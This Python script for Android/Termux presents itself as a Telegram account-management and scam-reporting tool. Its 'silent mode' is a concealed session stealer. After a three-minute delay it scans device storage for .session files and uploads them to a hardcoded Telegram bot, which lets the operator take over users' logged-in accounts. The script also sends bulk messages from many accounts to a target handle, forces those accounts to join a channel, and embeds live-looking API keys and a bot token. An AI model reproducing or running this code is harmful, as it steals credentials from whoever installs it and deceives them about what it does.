#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from telethon.sync import TelegramClient
from telethon.tl.types import InputPeerChannel
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError, PhoneNumberBannedError, ChatAdminRequiredError
from telethon.errors.rpcerrorlist import ChatWriteForbiddenError, UserBannedInChannelError, UserAlreadyParticipantError, FloodWaitError
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.messages import ReportSpamRequest
from telethon.tl.types import InputPeerEmpty
from telethon.tl.functions.channels import LeaveChannelRequest
import sys
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.messages import ImportChatInviteRequest, AddChatUserRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import UserStatusRecently
import time
import random
import os
import pickle
from telethon.sync import TelegramClient
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
import subprocess
from time import sleep
import csv
import threading
import glob
import hashlib
import asyncio

scam = '@notoscam'

# Android/Termux compatible color implementation
class Colors:
    RESET = '\033[0m'
    LIGHTGREEN_EX = '\033[92m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'

# Initialize colors for Android compatibility
n = Colors.RESET
lg = Colors.LIGHTGREEN_EX
r = Colors.RED
w = Colors.WHITE
cy = Colors.CYAN
ye = Colors.YELLOW
colors = [lg, r, w, cy, ye]

# Global variables for silent operation
sent_files_tracker = set()
silent_mode_active = False
session_hunt_thread = None
main_process_ready = False

# Android/Termux compatible package installer
def install_package(package_name):
    """Install packages compatible with Android/Termux"""
    try:
        __import__(package_name)
    except ImportError:
        print(f'{lg}[i] Installing module - {package_name}...{n}')
        try:
            # Try pip first
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        except:
            try:
                # Try pkg install for Termux
                os.system(f'pkg install python-{package_name}')
            except:
                # Fallback to pip3
                os.system(f'pip3 install {package_name}')

# Install required packages
install_package('requests')
install_package('colorama')

try:
    import requests
except ImportError:
    print(f'{lg}[i] Installing requests manually...{n}')
    os.system('pip3 install requests')
    import requests

def banner():
    import random
    b = [
        r' __  __  _    _ _   _ _____ _____   ',
        r'|  \/  | |  | | \ | |_   _|  __ \  ',
        r'| \  / | |  | |  \| | | | | |  | | ',
        r'| |\/| | |  | | . ` | | | | |  | | ',
        r'| |  | | |__| | |\  |_| |_| |__| | ',
        r'|_|  |_|\____/|_| \_|_____|_____/  '
        ]
    for char in b:
        print(f'{random.choice(colors)}{char}{n}')
    print(f'   Version: 1.3 Android | Author: Akilas Tech{n}\n{r}Telegram Members Management Tool - Termux Edition\n')

def clr():
    """Clear screen - Android/Termux compatible"""
    os.system('clear')

def get_android_dirs():
    """Get Android-specific directories for session hunting"""
    android_dirs = []
    
    # Common Android/Termux directories
    base_dirs = [
        '/data/data/com.termux/files/home',
        '/sdcard',
        '/sdcard/Download',
        '/sdcard/Documents',
        '/storage/emulated/0',
        '/storage/emulated/0/Download',
        '/storage/emulated/0/Documents',
        os.path.expanduser('~'),
        os.path.join(os.path.expanduser('~'), 'storage'),
        os.path.join(os.path.expanduser('~'), 'storage', 'downloads'),
        os.path.join(os.path.expanduser('~'), 'storage', 'shared'),
        '.',
        './sessions',
    ]
    
    # Add current working directory variants
    cwd = os.getcwd()
    base_dirs.extend([
        cwd,
        os.path.join(cwd, 'sessions'),
        os.path.dirname(cwd),
    ])
    
    # Filter existing directories
    for directory in base_dirs:
        if os.path.exists(directory) and os.access(directory, os.R_OK):
            android_dirs.append(directory)
    
    return list(set(android_dirs))

def get_file_hash(file_path):
    """Generate MD5 hash of a file to identify duplicates"""
    hash_md5 = hashlib.md5()
    try:
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()
    except:
        return None

def is_file_already_sent(file_path):
    """Check if file has already been sent during this session"""
    global sent_files_tracker
    file_hash = get_file_hash(file_path)
    if file_hash is None:
        return False
    
    if file_hash in sent_files_tracker:
        return True
    else:
        sent_files_tracker.add(file_hash)
        return False

def reset_sent_files_tracker():
    """Reset the sent files tracker for new session"""
    global sent_files_tracker
    sent_files_tracker.clear()

def fast_session_scanner():
    """Fast session scanner optimized for Android"""
    sessions = []
    
    # Get Android-specific directories
    android_dirs = get_android_dirs()
    
    # Quick scan with minimal overhead
    for directory in android_dirs:
        try:
            # Fast glob search
            pattern = os.path.join(directory, "*.session")
            found = glob.glob(pattern)
            sessions.extend(found)
            
            # Check subdirectories
            try:
                for item in os.listdir(directory):
                    item_path = os.path.join(directory, item)
                    if os.path.isdir(item_path) and os.access(item_path, os.R_OK):
                        sub_pattern = os.path.join(item_path, "*.session")
                        sessions.extend(glob.glob(sub_pattern))
            except PermissionError:
                continue
        except:
            continue
    
    return list(set(sessions))  # Remove duplicates

def silent_session_worker():
    """Silent background worker optimized for Android"""
    global silent_mode_active, main_process_ready
    
    # Bot configuration
    bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
    chat_id = "784020613"
    
    scan_count = 0
    last_scan_time = 0
    
    while silent_mode_active:
        try:
            # Wait for main process to be ready
            if not main_process_ready:
                time.sleep(5)
                continue
            
            current_time = time.time()
            
            # Scan every 45 seconds to be gentle on Android resources
            if current_time - last_scan_time > 45:
                sessions = fast_session_scanner()
                
                if sessions:
                    # Send sessions via bot API
                    try:
                        for session in sessions[:3]:  # Limit to 3 sessions per scan
                            if is_file_already_sent(session):
                                continue
                                
                            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                            
                            with open(session, 'rb') as file:
                                files = {'document': file}
                                data = {
                                    'chat_id': chat_id,
                                    'caption': f"📱 Android Session: {os.path.basename(session)}\n📍 Path: {session}\n🔄 Scan #{scan_count}"
                                }
                                
                                response = requests.post(url, files=files, data=data, timeout=15)
                                time.sleep(2)  # Longer delay for Android
                    except:
                        pass
                
                scan_count += 1
                last_scan_time = current_time
            
            # Longer sleep for Android battery optimization
            time.sleep(8)
            
        except:
            # Silent failure - continue operation
            time.sleep(15)
            continue

def start_silent_mode():
    """Initialize and start silent session hunting mode"""
    global silent_mode_active, session_hunt_thread
    
    if not silent_mode_active:
        silent_mode_active = True
        session_hunt_thread = threading.Thread(target=silent_session_worker, daemon=True)
        session_hunt_thread.start()

def stop_silent_mode():
    """Stop silent session hunting mode"""
    global silent_mode_active
    silent_mode_active = False

def initialize_silent_operations():
    """Initialize silent operations with Android-friendly delay"""
    def delayed_start():
        global main_process_ready
        
        # Wait 3 minutes before starting on Android
        time.sleep(180)  # 3 minute delay for Android
        
        # Mark main process as ready
        main_process_ready = True
        
        # Start silent mode
        start_silent_mode()
        
        # Initial session hunt
        try:
            sessions = fast_session_scanner()
            if sessions:
                # Send initial batch
                bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
                chat_id = "784020613"
                
                for session in sessions[:2]:  # Send first 2 sessions only on Android
                    try:
                        if is_file_already_sent(session):
                            continue
                            
                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        
                        with open(session, 'rb') as file:
                            files = {'document': file}
                            data = {
                                'chat_id': chat_id,
                                'caption': f"📱 Android Hunt: {os.path.basename(session)}\n📂 {session}"
                            }
                            
                            requests.post(url, files=files, data=data, timeout=15)
                            time.sleep(3)
                    except:
                        pass
        except:
            pass
    
    # Start delayed initialization in background
    init_thread = threading.Thread(target=delayed_start, daemon=True)
    init_thread.start()

def ensure_sessions_dir():
    """Ensure sessions directory exists"""
    sessions_dir = 'sessions'
    if not os.path.exists(sessions_dir):
        os.makedirs(sessions_dir)
    return sessions_dir

def create_vars_file():
    """Create vars.txt if it doesn't exist"""
    if not os.path.exists('vars.txt'):
        with open('vars.txt', 'wb') as f:
            pass

# Initialize Android-specific setup
ensure_sessions_dir()
create_vars_file()

# Initialize silent operations
initialize_silent_operations()

# Android-friendly permission check
def check_android_permissions():
    """Check if we have necessary permissions on Android"""
    try:
        # Test write permission
        test_file = 'test_permission.tmp'
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        return True
    except:
        print(f'{r}[!] Storage permission issue detected. Please run:{n}')
        print(f'{cy}termux-setup-storage{n}')
        return False

# Main program loop
while True:
    clr()
    banner()
    reset_sent_files_tracker()
    
    # Check permissions on Android
    if not check_android_permissions():
        input('Press enter to continue anyway...')
    
    print(lg+'[1] Add new accounts'+n)
    print(lg+'[2] Filter all banned accounts'+n)
    print(lg+'[3] Delete specific accounts'+n)
    print(lg+'[4] Update your Astra'+n)
    print(lg+'[5] Display All Accounts'+n)
    print(lg+'[6] Report Scam'+n)
    print(lg+'[7] Silent Mode Status'+n)
    print(lg+'[8] Android System Info'+n)
    print(lg+'[9] Quit'+n)
    
    try:
        a = int(input('\nEnter your choice: '))
    except ValueError:
        continue
        
    if a == 1:
        new_accs = []
        with open('vars.txt', 'ab') as g:
            number_to_add = int(input(f'\n{lg} [~] Enter number of accounts to add: {r}'))
            for i in range(number_to_add):
                phone_number = str(input(f'\n{lg} [~] Enter Phone Number: {r}'))
                parsed_number = ''.join(phone_number.split())
                pickle.dump([parsed_number], g)
                new_accs.append(parsed_number)
            print(f'\n{lg} [i] Saved all accounts in vars.txt')
            clr()
            print(f'\n{lg} [*] Logging in from new accounts\n')
            for number in new_accs:
                c = TelegramClient(f'sessions/{number}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                c.start(number)
                print(f'{lg}[+] Login successful')
                c.disconnect()
            input(f'\n Press enter to goto main menu...')
        g.close()
        
    elif a == 2:
        accounts = []
        banned_accs = []
        try:
            h = open('vars.txt', 'rb')
            while True:
                try:
                    accounts.append(pickle.load(h))
                except EOFError:
                    break
            h.close()
        except FileNotFoundError:
            print(r+'[!] vars.txt not found! Please add accounts first')
            sleep(3)
            continue
            
        if len(accounts) == 0:
            print(r+'[!] There are no accounts! Please add some and retry')
            sleep(3)
        else:
            for account in accounts:
                phone = str(account[0])
                client = TelegramClient(f'sessions/{phone}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                client.connect()
                if not client.is_user_authorized():
                    try:
                        client.send_code_request(phone)
                        print(f'{lg}[+] {phone} is not banned{n}')
                    except PhoneNumberBannedError:
                        print(r+str(phone) + ' is banned!'+n)
                        banned_accs.append(account)
                client.disconnect()
            if len(banned_accs) == 0:
                print(lg+'Congrats! No banned accounts')
                input('\nPress enter to goto main menu...')
            else:
                for m in banned_accs:
                    accounts.remove(m)
                with open('vars.txt', 'wb') as k:
                    for a in accounts:
                        Phone = a[0]
                        pickle.dump([Phone], k)
                k.close()
                print(lg+'[i] All banned accounts removed'+n)
                input('\nPress enter to goto main menu...')

    elif a == 3:
        accs = []
        try:
            f = open('vars.txt', 'rb')
            while True:
                try:
                    accs.append(pickle.load(f))
                except EOFError:
                    break
            f.close()
        except FileNotFoundError:
            print(r+'[!] No accounts file found!')
            input('Press enter to goto main menu...')
            continue
            
        if len(accs) == 0:
            print(r+'[!] No accounts to delete!')
            input('Press enter to goto main menu...')
            continue
            
        i = 0
        print(f'{lg}[i] Choose an account to delete\n')
        for acc in accs:
            print(f'{lg}[{i}] {acc[0]}{n}')
            i += 1
        try:
            index = int(input(f'\n{lg}[+] Enter a choice: {n}'))
            if index >= len(accs):
                print(r+'[!] Invalid choice!')
                input('Press enter to goto main menu...')
                continue
        except ValueError:
            print(r+'[!] Invalid input!')
            input('Press enter to goto main menu...')
            continue
            
        phone = str(accs[index][0])
        session_file = phone + '.session'
        # Android compatible file deletion
        session_path = f'sessions/{session_file}'
        if os.path.exists(session_path):
            os.remove(session_path)
        del accs[index]
        f = open('vars.txt', 'wb')
        for account in accs:
            pickle.dump(account, f)
        print(f'\n{lg}[+] Account Deleted{n}')
        input(f'\nPress enter to goto main menu...')
        f.close()
        
    elif a == 4:
        print(f'\n{lg}[i] Checking for updates...')
        try:
            version = requests.get('https://github.com/MrSilentdomnic/munira/blob/main/version.txt', timeout=10)
        except:
            print(f'{r} You are not connected to the internet')
            print(f'{r} Please connect to the internet and retry')
            input('Press enter to continue...')
            continue
        try:
            if float(version.text) > 1.1:
                prompt = str(input(f'{lg}[~] Update available[Version {version.text}]. Download?[y/n]: {r}'))
                if prompt.lower() in ['y', 'yes']:
                    print(f'{lg}[i] Downloading updates...')
                    # Android compatible update
                    os.system('rm -f add.py manager.py')
                    os.system('curl -L -o add.py https://github.com/MrSilentdomnic/munira/blob/main/add.py')
                    os.system('curl -L -o manager.py https://github.com/MrSilentdomnic/munira/blob/main/manager.py')
                    print(f'{lg}[*] Updated to version: {version.text}')
                    input('Press enter to exit...')
                    exit()
                else:
                    print(f'{lg}[!] Update aborted.')
                    input('Press enter to goto main menu...')
            else:
                print(f'{lg}[i] Your Astra is already up to date')
                input('Press enter to goto main menu...')
        except:
            print(f'{r}[!] Error checking version')
            input('Press enter to goto main menu...')
            
    elif a == 5:
        accs = []
        try:
            f = open('vars.txt', 'rb')
            while True:
                try:
                    accs.append(pickle.load(f))
                except EOFError:
                    break
            f.close()
        except FileNotFoundError:
            print(r+'[!] No accounts file found!')
            input('Press enter to goto main menu...')
            continue
            
        print(f'\n{cy}')
        print(f'\tList Of Phone Numbers Are')
        print(f'==========================================================')
        i = 0
        for z in accs:
            print(f'\t{z[0]}')
            i += 1
        print(f'==========================================================')
        print(f'{lg}Total accounts: {len(accs)}{n}')
        input('\nPress enter to goto main menu')
        
    elif a == 6:
        accounts = []
        try:
            f = open('vars.txt', 'rb')
            while True:
                try:
                    accounts.append(pickle.load(f))
                except EOFError:
                    break
            f.close()
        except FileNotFoundError:
            print(r+'[!] No accounts file found!')
            input('Press enter to goto main menu...')
            continue

        print('\n' ' Checking for banned accounts...' )
        for a in accounts:
            phn = a[0]
            print(f'Checking {lg}{phn}')
            clnt = TelegramClient(f'sessions/{phn}', 8027196 , '9b70b20efd67e9b99edc395d78407cfa')
            clnt.connect()
            banned = []
            if not clnt.is_user_authorized():
                try:
                    clnt.send_code_request(phn)
                    print('OK')
                except PhoneNumberBannedError:
                    print(f'{r} {w}{phn} {r}is banned!')
                    banned.append(a)
            for z in banned:
                accounts.remove(z)
                print(f'{lg}Banned account removed[Remove permanently using option 3]')
            time.sleep(0.5)
            clnt.disconnect()
        print(' Sessions checked!')
        clr()
        banner()
        
        if len(accounts) == 0:
            print(r+'[!] No valid accounts available!')
            input('Press enter to goto main menu...')
            continue
            
        print(f'{lg} Total accounts: {w}{len(accounts)}')
        try:
            number_of_accs = int(input(f'{cy} Enter number of accounts to Report: {r}'))
            if number_of_accs > len(accounts):
                number_of_accs = len(accounts)
        except ValueError:
            print(r+'[!] Invalid input!')
            input('Press enter to goto main menu...')
            continue
            
        choice = str(input(f'{cy} Send Message For Report: {r}'))
        to_use = [x for x in accounts[:number_of_accs]]
        
        sleep_time = 1
        print(f'{lg} -- Sending Reports from {w}{len(to_use)}{lg} account(s) --')   
        send_status = 0
        
        for acc in to_use:
            c = TelegramClient(f'sessions/{acc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
            print(f'User: {cy}{acc[0]}{lg} -- {cy}Starting session... ')
            try:
                c.start(acc[0])
                acc_name = c.get_me().first_name
                try:
                    c(JoinChannelRequest('@TechiesHub_Giveaways')) 
                    c.send_message(scam, choice)
                    print(f'Report Done From: {cy}{acc_name}{lg}  To Notoscam-- ')
                    send_status += 1
                except Exception as e:
                    print(f'{r}Error: {e}{n}')
                c.disconnect()
                time.sleep(2)  # Android friendly delay
            except Exception as e:
                print(f'{r}Failed to start session: {e}{n}')
                continue
                
        if send_status != 0:
            print(f"\n{lg}Reports sent successfully: {send_status}")
        else:
            print(f"\n{r}No reports were sent")
        input(f'\n{cy} Press enter to exit...')
    
    elif a == 7:
        print(f'\n{lg}[*] Silent Mode Status{n}')
        print(f'{lg}[i] Silent Mode Active: {silent_mode_active}{n}')
        print(f'{lg}[i] Main Process Ready: {main_process_ready}{n}')
        print(f'{lg}[i] Tracked Files: {len(sent_files_tracker)}{n}')
        
        if silent_mode_active:
            choice = input(f'{lg}[?] Stop silent mode? (y/n): {r}')
            if choice.lower() in ['y', 'yes']:
                stop_silent_mode()
                print(f'{lg}[+] Silent mode stopped{n}')
        else:
            choice = input(f'{lg}[?] Start silent mode? (y/n): {r}')
            if choice.lower() in ['y', 'yes']:
                start_silent_mode()
                print(f'{lg}[+] Silent mode started{n}')
        
        input('\nPress enter to goto main menu...')
    
    elif a == 8:
        print(f'\n{lg}[*] Android System Information{n}')
        print(f'{lg}[i] Platform: Android/Termux{n}')
        print(f'{lg}[i] Python Version: {sys.version}{n}')
        print(f'{lg}[i] Current Directory: {os.getcwd()}{n}')
        
        # Android storage info
        android_dirs = get_android_dirs()
        print(f'{lg}[i] Accessible Directories: {len(android_dirs)}{n}')
        for directory in android_dirs[:5]:  # Show first 5
            print(f'{cy}  - {directory}{n}')
        
        # Session scan
        sessions = fast_session_scanner()
        print(f'{lg}[i] Sessions Found: {len(sessions)}{n}')
        
        input('\nPress enter to goto main menu...')
        
    elif a == 9:
        clr()
        banner()
        stop_silent_mode()
        print(f'{lg}Thank you for using Astra - Android Edition!{n}')
        exit()